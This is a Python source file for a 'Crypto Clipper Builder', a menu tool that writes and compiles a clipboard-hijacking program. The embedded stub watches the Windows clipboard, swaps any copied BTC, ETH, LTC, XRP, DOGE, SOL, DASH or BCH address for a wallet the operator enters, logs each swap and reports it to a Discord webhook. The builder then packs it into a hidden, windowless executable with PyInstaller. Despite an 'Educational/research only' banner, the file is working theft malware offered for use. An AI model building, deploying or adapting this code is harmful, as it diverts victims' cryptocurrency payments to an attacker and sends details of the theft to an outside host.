"""Crypto Clipper Builder — Build standalone crypto clipboard swapper .exe"""

import os
import sys
import time
import subprocess

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

CLIPPER_STUB = r'''
import os, sys, time, re, subprocess, json, urllib.request
from datetime import datetime

WEBHOOK = "{webhook}"
DEBUG = {debug}
LOG_FILE = os.path.join(os.getenv("APPDATA", "."), "clip_log.txt")

def dprint(msg):
    if DEBUG:
        try:
            with open(os.path.join(os.getenv("APPDATA", "."), "clip_debug.txt"), "a") as f:
                f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{msg}}\n")
        except: pass

COINS = {{
    "BTC": r"^[13][a-km-zA-HJ-NP-Z1-9]{{25,34}}$|^bc1[a-zA-HJ-NP-Z0-9]{{25,90}}$",
    "ETH": r"^0x[a-fA-F0-9]{{40}}$",
    "LTC": r"^[LM][a-km-zA-HJ-NP-Z1-9]{{26,34}}$",
    "XRP": r"^r[1-9A-HJ-NP-Za-km-z]{{24,34}}$",
    "DOGE": r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$",
    "SOL": r"^[1-9A-HJ-NP-Za-km-z]{{32,44}}$",
    "DASH": r"^X[a-km-zA-HJ-NP-Z1-9]{{33}}$",
    "BCH": r"^bitcoincash:q[a-z0-9]{{41}}$|^[13][a-km-zA-HJ-NP-Z1-9]{{25,34}}$",
}}

REPLACEMENTS = {{re.compile(pat): (coin, addr) for coin, pat, addr in [
{replacements}
]}}

dprint(f"Loaded {{len(REPLACEMENTS)}} coin replacements")

def send_webhook(text):
    if not WEBHOOK: return
    try:
        data = json.dumps({{"content": f"🪙 **Crypto Clipper**\\n```\\n{{text}}\\n```"}}).encode()
        req = urllib.request.Request(WEBHOOK, data=data,
                                     headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
        urllib.request.urlopen(req, timeout=10)
    except: pass

def get_clip():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                           capture_output=True, text=True, timeout=5)
        val = r.stdout.strip()
        dprint(f"Clipboard read: {{val[:40]}}")
        return val
    except Exception as e:
        dprint(f"Clipboard read error: {{e}}")
        return ""

def set_clip(text):
    try:
        subprocess.run(["powershell", "-NoProfile", "-Command", f'Set-Clipboard -Value "{{text}}"'],
                       capture_output=True, timeout=5)
        dprint(f"Clipboard set: {{text[:40]}}")
    except Exception as e:
        dprint(f"Clipboard set error: {{e}}")

def detect(text):
    text = text.strip()
    for coin, pat in COINS.items():
        if re.match(pat, text):
            for regex, (c, addr) in REPLACEMENTS.items():
                if c == coin and addr and text != addr:
                    dprint(f"DETECTED {{coin}}: {{text[:30]}} -> {{addr[:30]}}")
                    return coin, addr
    return None, None

def log_swap(coin, orig, repl):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{{datetime.now().strftime('%H:%M:%S')}}] {{coin}}: {{orig[:30]}} -> {{repl[:30]}}\n")
        dprint(f"Swap logged to {{LOG_FILE}}")
        send_webhook(f"**{{coin}}** swapped\\nOriginal: `{{orig[:40]}}`\\nReplaced: `{{repl[:40]}}`")
    except Exception as e:
        dprint(f"Log write error: {{e}}")

def main():
    dprint("Crypto clipper started")
    last = ""
    checks = 0
    swaps = 0
    while True:
        try:
            cur = get_clip()
            if cur and cur != last:
                last = cur
                checks += 1
                coin, addr = detect(cur)
                if coin:
                    set_clip(addr)
                    log_swap(coin, cur, addr)
                    swaps += 1
                    dprint(f"Total: {{checks}} checks, {{swaps}} swaps")
        except Exception as e:
            dprint(f"Main loop error: {{e}}")
        time.sleep(0.3)

if __name__ == "__main__":
    try:
        dprint("=== CLIPPER LAUNCHED ===")
        main()
    except Exception as e:
        dprint(f"FATAL: {{e}}")
'''

COINS_PAT = {
    "BTC": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{25,90}$",
    "ETH": r"^0x[a-fA-F0-9]{40}$",
    "LTC": r"^[LM][a-km-zA-HJ-NP-Z1-9]{26,34}$",
    "XRP": r"^r[1-9A-HJ-NP-Za-km-z]{24,34}$",
    "DOGE": r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$",
    "SOL": r"^[1-9A-HJ-NP-Za-km-z]{32,44}$",
    "DASH": r"^X[a-km-zA-HJ-NP-Z1-9]{33}$",
    "BCH": r"^bitcoincash:q[a-z0-9]{41}$|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
}


def _debug_print(title, msg):
    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")


def run(kevbin=None):
    debug_mode = False
    while True:
        clear()
        dbg_tag = " \033[91m[DEBUG ON]\033[0m" if debug_mode else ""
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       CRYPTO CLIPPER BUILDER{dbg_tag}" + " "*(20-len(dbg_tag)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] Educational/research only\033[0m")
        print()
        cprint("  \033[97m[1]  Build Clipper (.py)\033[0m")
        cprint("  \033[97m[2]  Build Clipper (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[97m[4]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '4':
            debug_mode = not debug_mode
            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
            cprint(f"  Debug mode: {state}")
            time.sleep(0.6)
            continue
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  CONFIGURE REPLACEMENT WALLETS\033[0m")
            cprint("  \033[90m  Enter your wallet address for each coin (empty to skip)\033[0m")
            cprint("  \033[93m\u2550"*54)
            print()
            replacements = []
            for coin in ["BTC", "ETH", "LTC", "XRP", "DOGE", "SOL", "DASH", "BCH"]:
                addr = prompt(f"  \033[96m{coin}: \033[0m").strip()
                if addr:
                    replacements.append((coin, addr))
                    cprint(f"  \033[92m  [X] {coin} set\033[0m")
                    if debug_mode:
                        _debug_print("ADDR", f"{coin} = {addr[:20]}...")
            if not replacements:
                cprint("  \033[91m[X] No addresses configured\033[0m"); pause(); continue
            print()
            webhook = prompt("  \033[96mDiscord Webhook URL (empty to skip notifications): \033[0m").strip()
            if webhook and 'discord' not in webhook:
                cprint("  \033[91m[X] Invalid webhook, skipping\033[0m"); webhook = ""
            if debug_mode:
                _debug_print("WEBHOOK", webhook[:40] + "..." if webhook else "NONE")
            if debug_mode:
                _debug_print("CONFIG", f"{len(replacements)} coins configured")
            rep_lines = []
            for coin, addr in replacements:
                rep_lines.append(f'    ("{coin}", r"{COINS_PAT.get(coin, "")}", "{addr}"),')
            rep_block = "\n".join(rep_lines)
            stub = CLIPPER_STUB.replace("{replacements}", rep_block)
            stub = stub.replace("{debug}", "True" if debug_mode else "False")
            stub = stub.replace("{webhook}", webhook or "")
            out = prompt("  \033[96mOutput filename (default: clipper.py): \033[0m").strip() or "clipper.py"
            if not out.endswith('.py'): out += '.py'
            if debug_mode:
                _debug_print("STUB", f"Length: {len(stub)} bytes")
                _debug_print("STUB", f"Replacements embedded: {len(replacements)}")
            with open(out, 'w', encoding='utf-8') as f:
                f.write(stub)
            fsize = os.path.getsize(out)
            cprint(f"  \033[92m[X] Saved: {out} ({fsize} bytes)\033[0m")
            if debug_mode:
                _debug_print("FILE", f"Written: {os.path.abspath(out)}")
            if choice == '2':
                exe_name = os.path.splitext(out)[0] + ".exe"
                if debug_mode:
                    _debug_print("BUILD", f"Target: dist/{exe_name}")
                    _debug_print("BUILD", f"Source: {os.path.abspath(out)}")
                    _debug_print("BUILD", f"Python: {sys.executable}")
                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                try:
                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
                           '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
                    if debug_mode:
                        _debug_print("CMD", " ".join(cmd))
                    result = subprocess.run(cmd, check=True, timeout=180,
                                           capture_output=debug_mode, text=debug_mode)
                    if debug_mode and result.stdout:
                        for line in result.stdout.strip().split('\n')[-8:]:
                            _debug_print("PYINST", line.strip())
                    dist_path = os.path.join("dist", exe_name)
                    if os.path.isfile(dist_path):
                        esize = os.path.getsize(dist_path)
                        cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
                        if debug_mode:
                            _debug_print("DONE", f"Full path: {os.path.abspath(dist_path)}")
                    else:
                        cprint(f"  \033[93m[?] Compiled but {dist_path} not found\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
                except subprocess.TimeoutExpired:
                    cprint("  \033[91m[X] Build timed out (180s)\033[0m")
                except subprocess.CalledProcessError as e:
                    cprint(f"  \033[91m[X] Build failed: exit code {e.returncode}\033[0m")
                    if debug_mode and e.stderr:
                        for line in str(e.stderr).strip().split('\n')[-6:]:
                            _debug_print("ERR", line.strip())
                except Exception as e:
                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
                    if debug_mode:
                        _debug_print("EXC", str(e))
        elif choice == '3':
            clear()
            stub = CLIPPER_STUB.replace("{replacements}", '    ("BTC", "^[13]...", "YOUR_BTC"),\n    ("ETH", "^0x...", "YOUR_ETH"),')
            stub = stub.replace("{debug}", "False")
            stub = stub.replace("{webhook}", "WEBHOOK_URL_HERE")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
